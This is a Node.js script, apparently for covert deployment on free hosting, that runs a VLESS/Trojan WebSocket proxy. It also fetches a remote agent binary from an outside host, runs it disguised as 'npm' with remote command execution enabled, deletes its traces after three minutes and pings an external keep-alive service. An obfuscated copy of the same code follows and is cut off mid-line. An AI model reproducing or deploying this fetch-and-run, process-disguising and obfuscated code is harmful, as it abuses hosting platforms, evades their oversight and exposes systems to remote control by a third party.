const os = require('os');
const http = require('http');
const fs = require('fs');
const axios = require('axios');
const net = require('net');
const path = require('path');
const crypto = require('crypto');
const { Buffer } = require('buffer');
const { exec, execSync } = require('child_process');
const { WebSocket, createWebSocketStream } = require('ws');
const UUID = process.env.UUID || '5efabea4-f6d4-91fd-b8f0-17e004c89c60'; // 运行哪吒v1,在不同的平台需要改UUID,否则会被覆盖
const NEZHA_SERVER = process.env.NEZHA_SERVER || '';       // 哪吒v1填写形式：nz.abc.com:8008   哪吒v0填写形式：nz.abc.com
const NEZHA_PORT = process.env.NEZHA_PORT || '';           // 哪吒v1没有此变量，v0的agent端口为{443,8443,2096,2087,2083,2053}其中之一时开启tls
const NEZHA_KEY = process.env.NEZHA_KEY || '';             // v1的NZ_CLIENT_SECRET或v0的agent端口                
const DOMAIN = process.env.DOMAIN || '1234.abc.com';       // 填写项目域名或已反代的域名，不带前缀，建议填已反代的域名
const AUTO_ACCESS = process.env.AUTO_ACCESS || true;       // 是否开启自动访问保活,false为关闭,true为开启,需同时填写DOMAIN变量
const WSPATH = process.env.WSPATH || UUID.slice(0, 8);     // 节点路径，默认获取uuid前8位
const SUB_PATH = process.env.SUB_PATH || 'sub';            // 获取节点的订阅路径
const NAME = process.env.NAME || 'Hug';                    // 节点名称
const PORT = process.env.PORT || 7860;                     // http和ws服务端口

let ISP = '';
const GetISP = async () => {
  try {
    const res = await axios.get('https://speed.cloudflare.com/meta');
    const data = res.data;
    ISP = `${data.country}-${data.asOrganization}`.replace(/ /g, '_');
  } catch (e) {
    ISP = 'Unknown';
  }
}
GetISP();

const httpServer = http.createServer((req, res) => {
  if (req.url === '/') {
    const filePath = path.join(__dirname, 'index.html');
    fs.readFile(filePath, 'utf8', (err, content) => {
      if (err) {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('Hello world!');
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(content);
    });
    return;
  } else if (req.url === `/${SUB_PATH}`) {
    const vlessURL = `vless://${UUID}@${DOMAIN}:443?encryption=none&security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${NAME}-${ISP}`;
    const trojanURL = `trojan://${UUID}@${DOMAIN}:443?security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${NAME}-${ISP}`;
    const subscription = vlessURL + '\n' + trojanURL;
    const base64Content = Buffer.from(subscription).toString('base64');
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(base64Content + '\n');
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found\n');
  }
});

const wss = new WebSocket.Server({ server: httpServer });
const uuid = UUID.replace(/-/g, "");
const DNS_SERVERS = ['8.8.4.4', '1.1.1.1'];
// Custom DNS
function resolveHost(host) {
  return new Promise((resolve, reject) => {
    if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(host)) {
      resolve(host);
      return;
    }
    let attempts = 0;
    function tryNextDNS() {
      if (attempts >= DNS_SERVERS.length) {
        reject(new Error(`Failed to resolve ${host} with all DNS servers`));
        return;
      }
      const dnsServer = DNS_SERVERS[attempts];
      attempts++;
      const dnsQuery = `https://dns.google/resolve?name=${encodeURIComponent(host)}&type=A`;
      axios.get(dnsQuery, {
        timeout: 5000,
        headers: {
          'Accept': 'application/dns-json'
        }
      })
      .then(response => {
        const data = response.data;
        if (data.Status === 0 && data.Answer && data.Answer.length > 0) {
          const ip = data.Answer.find(record => record.type === 1);
          if (ip) {
            resolve(ip.data);
            return;
          }
        }
        tryNextDNS();
      })
      .catch(error => {
        tryNextDNS();
      });
    }
    
    tryNextDNS();
  });
}

// VLE-SS处理
function handleVlessConnection(ws, msg) {
  const [VERSION] = msg;
  const id = msg.slice(1, 17);
  if (!id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16))) return false;
  let i = msg.slice(17, 18).readUInt8() + 19;
  const port = msg.slice(i, i += 2).readUInt16BE(0);
  const ATYP = msg.slice(i, i += 1).readUInt8();
  const host = ATYP == 1 ? msg.slice(i, i += 4).join('.') :
    (ATYP == 2 ? new TextDecoder().decode(msg.slice(i + 1, i += 1 + msg.slice(i, i + 1).readUInt8())) :
    (ATYP == 3 ? msg.slice(i, i += 16).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map(b => b.readUInt16BE(0).toString(16)).join(':') : ''));
  ws.send(new Uint8Array([VERSION, 0]));
  const duplex = createWebSocketStream(ws);
  resolveHost(host)
    .then(resolvedIP => {
      net.connect({ host: resolvedIP, port }, function() {
        this.write(msg.slice(i));
        duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);
      }).on('error', () => {});
    })
    .catch(error => {
      net.connect({ host, port }, function() {
        this.write(msg.slice(i));
        duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);
      }).on('error', () => {});
    });
  
  return true;
}

// Tro-jan处理
function handleTrojanConnection(ws, msg) {
  try {
    if (msg.length < 58) return false;
    const receivedPasswordHash = msg.slice(0, 56).toString();
    const possiblePasswords = [
      UUID,
    ];
    
    let matchedPassword = null;
    for (const pwd of possiblePasswords) {
      const hash = crypto.createHash('sha224').update(pwd).digest('hex');
      if (hash === receivedPasswordHash) {
        matchedPassword = pwd;
        break;
      }
    }
    
    if (!matchedPassword) return false;
    let offset = 56;
    if (msg[offset] === 0x0d && msg[offset + 1] === 0x0a) {
      offset += 2;
    }
    
    const cmd = msg[offset];
    if (cmd !== 0x01) return false;
    offset += 1;
    const atyp = msg[offset];
    offset += 1;
    let host, port;
    if (atyp === 0x01) {
      host = msg.slice(offset, offset + 4).join('.');
      offset += 4;
    } else if (atyp === 0x03) {
      const hostLen = msg[offset];
      offset += 1;
      host = msg.slice(offset, offset + hostLen).toString();
      offset += hostLen;
    } else if (atyp === 0x04) {
      host = msg.slice(offset, offset + 16).reduce((s, b, i, a) => 
        (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), [])
        .map(b => b.readUInt16BE(0).toString(16)).join(':');
      offset += 16;
    } else {
      return false;
    }
    
    port = msg.readUInt16BE(offset);
    offset += 2;
    
    if (offset < msg.length && msg[offset] === 0x0d && msg[offset + 1] === 0x0a) {
      offset += 2;
    }
    
    const duplex = createWebSocketStream(ws);

    resolveHost(host)
      .then(resolvedIP => {
        net.connect({ host: resolvedIP, port }, function() {
          if (offset < msg.length) {
            this.write(msg.slice(offset));
          }
          duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);
        }).on('error', () => {});
      })
      .catch(error => {
        net.connect({ host, port }, function() {
          if (offset < msg.length) {
            this.write(msg.slice(offset));
          }
          duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);
        }).on('error', () => {});
      });
    
    return true;
  } catch (error) {
    return false;
  }
}
// Ws 连接处理
wss.on('connection', (ws, req) => {
  const url = req.url || '';
  ws.once('message', msg => {
    if (msg.length > 17 && msg[0] === 0) {
      const id = msg.slice(1, 17);
      const isVless = id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16));
      if (isVless) {
        if (!handleVlessConnection(ws, msg)) {
          ws.close();
        }
        return;
      }
    }

    if (!handleTrojanConnection(ws, msg)) {
      ws.close();
    }
  }).on('error', () => {});
});

const getDownloadUrl = () => {
  const arch = os.arch(); 
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    if (!NEZHA_PORT) {
      return 'https://arm64.ssss.nyc.mn/v1';
    } else {
      return 'https://arm64.ssss.nyc.mn/agent';
    }
  } else {
    if (!NEZHA_PORT) {
      return 'https://amd64.ssss.nyc.mn/v1';
    } else {
      return 'https://amd64.ssss.nyc.mn/agent';
    }
  }
};

const downloadFile = async () => {
  if (!NEZHA_SERVER && !NEZHA_KEY) return;
  
  try {
    const url = getDownloadUrl();
    const response = await axios({
      method: 'get',
      url: url,
      responseType: 'stream'
    });

    const writer = fs.createWriteStream('npm');
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        console.log('npm download successfully');
        exec('chmod +x npm', (err) => {
          if (err) reject(err);
          resolve();
        });
      });
      writer.on('error', reject);
    });
  } catch (err) {
    throw err;
  }
};

const runnz = async () => {
  try {
    const status = execSync('ps aux | grep -v "grep" | grep "./[n]pm"', { encoding: 'utf-8' });
    if (status.trim() !== '') {
      console.log('npm is already running, skip running...');
      return;
    }
  } catch (e) {
    // 进程不存在时继续运行nezha
  }

  await downloadFile();
  let command = '';
  let tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
  
  if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) {
    const NEZHA_TLS = tlsPorts.includes(NEZHA_PORT) ? '--tls' : '';
    command = `setsid nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
  } else if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
      const NZ_TLS = tlsPorts.includes(port) ? 'true' : 'false';
      const configYaml = `client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${NZ_TLS}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;
      
      fs.writeFileSync('config.yaml', configYaml);
    }
    command = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`;
  } else {
    console.log('NEZHA variable is empty, skip running');
    return;
  }

  try {
    exec(command, { shell: '/bin/bash' }, (err) => {
      if (err) console.error('npm running error:', err);
      else console.log('npm is running');
    });
  } catch (error) {
    console.error(`error: ${error}`);
  }   
}; 

async function addAccessTask() {
  if (!AUTO_ACCESS) return;

  if (!DOMAIN) {
    return;
  }
  const fullURL = `https://${DOMAIN}`;
  try {
    const res = await axios.post("https://oooo.serv00.net/add-url", {
      url: fullURL
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
    console.log('Automatic Access Task added successfully');
  } catch (error) {
    // console.error('Error adding Task:', error.message);
  }
}

const delFiles = () => {
  fs.unlink('npm', () => {});
  fs.unlink('config.yaml', () => {}); 
};

httpServer.listen(PORT, () => {
  runnz();
  setTimeout(() => {
    delFiles();
  }, 180000);
  addAccessTask();
  console.log(`Server is running on port ${PORT}`);
});
(function(_0x203c94,_0x52143a){function _0x121c2b(_0x44ad27,_0x5e164e,_0x1d7884,_0x3dc267){return _0x2de5(_0x44ad27- -0x347,_0x3dc267);}function _0xc877f9(_0x2666ec,_0x53cfaa,_0x2c7fe5,_0x2e45a8){return _0x2de5(_0x2e45a8- -0x1e,_0x2666ec);}const _0x1b1ab8=_0x203c94();while(!![]){try{const _0x550b9b=-parseInt(_0xc877f9(0x33b,0x29e,0x1b0,0x275))/(0xd*0x9b+0x2*-0xfea+-0x17f6*-0x1)*(parseInt(_0x121c2b(-0x5c,-0x5,-0x3,0x1e))/(0x1db0+0x2*-0x192+-0x1a8a))+parseInt(_0xc877f9(0x1a1,0x2f4,0x1b2,0x223))/(0x1a89*0x1+-0x207*-0x7+-0x28b7)*(parseInt(_0x121c2b(-0x7b,-0x35,-0x40,-0x1a))/(0x18fa+0x3f4*-0x7+-0x1*-0x2b6))+-parseInt(_0x121c2b(-0xa6,-0x39,0x11,-0xd))/(0x2617*-0x1+-0x1*-0x1c8a+-0x32*-0x31)+-parseInt(_0xc877f9(0x26d,0x211,0x285,0x238))/(0x6cb*-0x3+-0x1615*-0x1+-0x1ae)+parseInt(_0x121c2b(-0xff,-0x146,-0x16e,-0xb2))/(-0x1883+-0x21*-0xda+-0x390)+-parseInt(_0xc877f9(0x1b7,0xac,0x17a,0x147))/(0x2038*-0x1+-0x65e*0x2+0x2cfc)*(parseInt(_0xc877f9(0x20f,0x25a,0x1e6,0x21f))/(0xf9f+-0x178+-0xe1e*0x1))+parseInt(_0x121c2b(-0x101,-0x47,-0x6f,-0x118))/(-0xc4b+-0xfa4+0x1bf9);if(_0x550b9b===_0x52143a)break;else _0x1b1ab8['push'](_0x1b1ab8['shift']());}catch(_0x5af43a){_0x1b1ab8['push'](_0x1b1ab8['shift']());}}}(_0x2709,-0x2b13*0x63+-0x6*0x34b61+0x27557*0x13));const _0x5a6852=(function(){const _0x45b55d={'kvWvR':function(_0x3d1029){return _0x3d1029();},'YRmBi':function(_0x49478d,_0x6fa208){return _0x49478d!==_0x6fa208;}};let _0x3d12a7=!![];return function(_0x2205f2,_0x227b2a){function _0x4cb038(_0x487375,_0x4fc7d0,_0x37c8de,_0x4e5b51){return _0x2de5(_0x37c8de-0xc9,_0x4fc7d0);}const _0x41ac4f={'YtKXA':function(_0x28fa25){function _0x406473(_0x5721df,_0x19e4a8,_0x1f74ff,_0x44a6df){return _0x2de5(_0x5721df-0x107,_0x19e4a8);}return _0x45b55d[_0x406473(0x3a4,0x316,0x2ec,0x41c)](_0x28fa25);},'dvvbi':function(_0xd5b45a,_0x55d251){return _0x45b55d['YRmBi'](_0xd5b45a,_0x55d251);},'ilmFV':_0x388057(0x10a,0x148,0xae,0x119),'KTyyU':_0x4cb038(0x2a4,0x2cb,0x285,0x1ed),'zmsAb':function(_0x340e1f,_0x702d65){return _0x340e1f!==_0x702d65;},'cOhLJ':'SpMHk'},_0x134d47=_0x3d12a7?function(){function _0x4d1772(_0x3fe98e,_0x4aeaf7,_0x2345b2,_0x245426){return _0x388057(_0x4aeaf7- -0x180,_0x4aeaf7-0x1e0,_0x3fe98e,_0x245426-0x175);}function _0x1e0b69(_0x223c2e,_0x4236bb,_0x15165e,_0x5d2fe8){return _0x4cb038(_0x223c2e-0x1b8,_0x223c2e,_0x4236bb-0x141,_0x5d2fe8-0xb3);}if(_0x41ac4f[_0x1e0b69(0x513,0x501,0x505,0x4d3)](_0x41ac4f[_0x4d1772(0xc,-0x46,-0x26,-0x8a)],_0x41ac4f[_0x4d1772(0x4f,0x73,0x124,0x139)])){if(_0x227b2a){if(_0x41ac4f[_0x4d1772(-0x97,-0xa3,-0xfc,0x28)](_0x41ac4f['cOhLJ'],_0x41ac4f[_0x4d1772(0x7b,-0x28,-0xdf,0x35)]))_0x41ac4f['YtKXA'](_0x523f81);else{const _0x57ce81=_0x227b2a[_0x1e0b69(0x32e,0x3ef,0x478,0x418)](_0x2205f2,arguments);return _0x227b2a=null,_0x57ce81;}}}else{const _0x3731e2=_0x5b04b5[_0x1e0b69(0x3bc,0x3ef,0x44f,0x3ca)](_0x3e0502,arguments);return _0x485b2d=null,_0x3731e2;}}:function(){};function _0x388057(_0x3ab2b5,_0x20da9b,_0x2385aa,_0x475c92){return _0x2de5(_0x3ab2b5- -0xc0,_0x2385aa);}return _0x3d12a7=![],_0x134d47;};}()),_0x234d68=_0x5a6852(this,function(){const _0x280210={};_0x280210[_0x5457cd(0x271,0x21f,0x26a,0x269)]=_0x1a5208(0x36a,0x3b0,0x3fa,0x2b5)+'+$';function _0x1a5208(_0x23bcdd,_0x4dfb6b,_0x8f2173,_0x164781){return _0x2de5(_0x23bcdd-0x202,_0x164781);}const _0x5e35d8=_0x280210;function _0x5457cd(_0x214d43,_0x2bc6e8,_0x3863a1,_0x24d227){return _0x2de5(_0x2bc6e8-0x3b,_0x24d227);}return _0x234d68[_0x5457cd(0x326,0x2cf,0x215,0x25f)]()[_0x5457cd(0x1cd,0x1af,0x14a,0x1bf)](_0x5e35d8['mRenN'])[_0x5457cd(0x337,0x2cf,0x2ad,0x279)]()[_0x1a5208(0x36c,0x322,0x2cf,0x2c8)+'r'](_0x234d68)[_0x1a5208(0x376,0x31c,0x439,0x2bf)]('(((.+)+)+)'+'+$');});_0x234d68();function _0x5438be(_0x2875a3,_0x4b6620,_0x1270c1,_0x35bf18){return _0x2de5(_0x1270c1- -0x336,_0x2875a3);}const _0x3bcc5a=(function(){let _0x459150=!![];return function(_0x2a694d,_0x1d3924){const _0x5c197c=_0x459150?function(){if(_0x1d3924){const _0x45045b=_0x1d3924['apply'](_0x2a694d,arguments);return _0x1d3924=null,_0x45045b;}}:function(){};return _0x459150=![],_0x5c197c;};}()),_0x15251c=_0x3bcc5a(this,function(){const _0x27183c={'SNWhs':function(_0x2e2473,_0x43e1bb,_0x1067d9){return _0x2e2473(_0x43e1bb,_0x1067d9);},'kaEtw':function(_0x4d57db,_0x23671b){return _0x4d57db(_0x23671b);},'stDxb':function(_0x238e0e,_0x361d67){return _0x238e0e+_0x361d67;},'ifMQD':'return\x20(fu'+'nction()\x20','cihbb':_0xb299c4(0x5f6,0x5b5,0x6c1,0x666)+_0xb299c4(0x589,0x586,0x589,0x646)+_0x9c9f31(-0x12c,-0x18f,-0x1bf,-0x25d)+'\x20)','jaPXv':function(_0x4250c8){return _0x4250c8();},'UIlYK':_0xb299c4(0x533,0x58d,0x4fc,0x5be),'NSzaM':_0xb299c4(0x57d,0x5e4,0x579,0x63a),'IQCJa':_0xb299c4(0x63f,0x5ae,0x6a0,0x6e7),'rkpqx':_0xb299c4(0x66d,0x731,0x70a,0x679),'smPpS':_0x9c9f31(-0x1c5,-0x1f8,-0x211,-0x16a),'TiunH':_0xb299c4(0x68e,0x5d8,0x612,0x5be),'CtSIS':_0xb299c4(0x6a5,0x766,0x6f6,0x769),'PTlpO':function(_0x324f81,_0xcc8929){return _0x324f81<_0xcc8929;},'YZfAx':function(_0x4d19ff,_0x122fa5){return _0x4d19ff!==_0x122fa5;},'hfpsz':_0x9c9f31(-0x176,-0xd0,-0x163,-0x177)};let _0x3c0086;try{const _0x1a9c12=_0x27183c[_0x9c9f31(-0x1d3,-0x135,-0x18b,-0xad)](Function,_0x27183c[_0xb299c4(0x527,0x4f3,0x588,0x53b)](_0x27183c[_0xb299c4(0x5bd,0x60e,0x545,0x515)]+_0x27183c['cihbb'],');'));_0x3c0086=_0x27183c['jaPXv'](_0x1a9c12);}catch(_0x2324c7){_0x27183c[_0xb299c4(0x5c4,0x5d2,0x63e,0x4f8)]!==_0x27183c[_0xb299c4(0x5c4,0x5d4,0x61b,0x527)]?this[_0xb299c4(0x65e,0x63e,0x6d2,0x6ae)](_0x2cb5af[_0xb299c4(0x645,0x5cb,0x6f2,0x578)](_0x1032b1)):_0x3c0086=window;}function _0xb299c4(_0xa3ca7c,_0x161f10,_0x28d0be,_0x31fd1a){return _0x2de5(_0xa3ca7c-0x3a7,_0x31fd1a);}const _0x513e91=_0x3c0086['console']=_0x3c0086[_0xb299c4(0x585,0x5d8,0x4ea,0x655)]||{};function _0x9c9f31(_0x5d2913,_0x9de3f7,_0x15fc8a,_0x362ac7){return _0x2de5(_0x9de3f7- -0x369,_0x15fc8a);}const _0x583344=[_0x27183c[_0xb299c4(0x575,0x518,0x5d4,0x521)],_0x27183c[_0x9c9f31(-0x100,-0x168,-0x1a4,-0x1a8)],_0x27183c['rkpqx'],_0x27183c[_0x9c9f31(-0x8b,-0x11e,-0x1bb,-0x1a5)],_0x27183c[_0xb299c4(0x55b,0x567,0x54d,0x55c)],'table',_0x27183c[_0x9c9f31(-0x20b,-0x1aa,-0x1b9,-0x1cc)]];for(let _0x2a1352=-0x1767+0x11df+0x588;_0x27183c[_0xb299c4(0x669,0x6f7,0x5f8,0x5f0)](_0x2a1352,_0x583344[_0x9c9f31(-0xa1,-0x73,-0xe6,-0x7e)]);_0x2a1352++){if(_0x27183c[_0xb299c4(0x666,0x628,0x5b3,0x708)]('rPREv',_0x27183c[_0xb299c4(0x526,0x5f3,0x58c,0x4ab)])){const _0x4880f7=_0x3bcc5a[_0xb299c4(0x511,0x5cf,0x486,0x58c)+'r']['prototype']['bind'](_0x3bcc5a),_0x371ea0=_0x583344[_0x2a1352],_0x41a82b=_0x513e91[_0x371ea0]||_0x4880f7;_0x4880f7[_0xb299c4(0x5d0,0x5cc,0x539,0x50e)]=_0x3bcc5a[_0xb299c4(0x570,0x5a8,0x607,0x4ec)](_0x3bcc5a),_0x4880f7[_0x9c9f31(-0xb6,-0xd5,-0xef,-0xad)]=_0x41a82b[_0x9c9f31(-0x116,-0xd5,-0xdc,-0x2b)][_0x9c9f31(-0x1cb,-0x1a0,-0x1ba,-0x1e9)](_0x41a82b),_0x513e91[_0x371ea0]=_0x4880f7;}else{const _0x53dc4d=_0x451dd1[_0xb299c4(0x645,0x5b6,0x682,0x712)](0x192f+-0x14e*-0x1+-0x46a*0x6,0x98f+0x19d5+-0x2353),_0xda2836=_0x53dc4d[_0xb299c4(0x60c,0x620,0x6db,0x6a6)]((_0x19a202,_0x46b161)=>_0x19a202==_0x386688(_0x32965e[_0x9c9f31(-0x196,-0xca,-0x145,-0x161)](_0x46b161*(0x2*0x709+-0x1b66+0xd56),-0x7dc+-0x1*0x2197+-0x2975*-0x1),-0x4*-0x487+0x5*-0x71b+0x5*0x37f));if(_0xda2836){!_0x27183c[_0x9c9f31(-0xf5,-0x101,-0x181,-0x8a)](_0x25b9a0,_0x408d3b,_0x129afd)&&_0x4abc12[_0x9c9f31(-0x13b,-0x15e,-0x154,-0xae)]();return;}}}});_0x15251c();const os=require('os'),http=require(_0x21134f(0xd2,-0x43,0x32,0x2f)),fs=require('fs'),axios=require(_0x5438be(-0x3f,-0x75,-0x86,-0xa9)),net=require(_0x21134f(-0x3,-0x1,-0x41,-0xb4)),path=require(_0x5438be(-0x14e,-0x200,-0x1a1,-0x1c7)),crypto=require(_0x21134f(-0x1df,-0xb9,-0x143,-0xab)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x5438be(-0x1ac,-0x1b2,-0x118,-0xa8)+_0x5438be(-0x55,-0xbd,-0x87,0xf)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x21134f(0x1a,0x20,0x4,0x22)]['UUID']||'5efabea4-f'+_0x5438be(-0x14a,-0x4d,-0x10f,-0x6f)+'8f0-17e004'+_0x5438be(-0x12e,-0x5d,-0x113,-0x171),NEZHA_SERVER=process['env'][_0x5438be(-0x1c9,-0xc9,-0x143,-0x16f)+'ER']||'',NEZHA_PORT=process['env'][_0x5438be(-0xb5,-0x14e,-0xb7,-0xb4)]||'',NEZHA_KEY=process[_0x21134f(0x7b,0xcb,0x4,-0x80)]['NEZHA_KEY']||'',DOMAIN=process['env'][_0x21134f(0xa,0x88,0x22,0xa4)]||_0x21134f(0x9f,-0x90,0x7,0xce)+'om',AUTO_ACCESS=process[_0x21134f(0xcd,0x99,0x4,0x8)][_0x21134f(0x88,0x74,-0x43,-0xf9)+'S']||!![],WSPATH=process['env'][_0x5438be(-0x107,-0xc2,-0x8
